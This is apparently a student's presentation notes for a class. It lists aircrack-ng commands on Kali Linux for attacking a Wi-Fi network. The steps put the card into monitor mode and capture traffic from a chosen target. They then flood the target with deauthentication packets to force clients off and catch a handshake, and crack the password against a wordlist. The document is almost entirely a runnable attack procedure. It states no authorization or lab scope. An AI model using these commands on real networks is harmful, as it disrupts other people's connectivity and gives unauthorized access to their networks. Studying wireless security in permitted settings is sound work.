# U aircrack-ng
UCLA Final Presentation: Aircrack-ng on Kali Linux

# Verify airmon-ng has no issues:
sudo airmon-ng check

# Determine name of wireless adapter
sudo iwconfig

# Enable monitor mode in the Wi-Fi card
sudo airmon-ng start wlan0
# Do not close terminal.
 
 # Capture the network packets
 sudo airodump-ng wlan0mon
 
 # Identify target network and note BSSID (MAC address) and channel
 sudo airodump-ng --bssid (BSSID) -c (channel) -w (capture file output name) wlan0mon
 
 # Open seperate terminal while packets are capturing
 # In sperate terminal, run:
 sudo aireplay-ng --deauth 100 -a (BSSID) wlan0mon
 
 # Stop capture
 ctrl +c 
 
 # Crack password
 sudo aircrack-ng -b (BSSID) -w (path to wordlist) (capture file name).cap
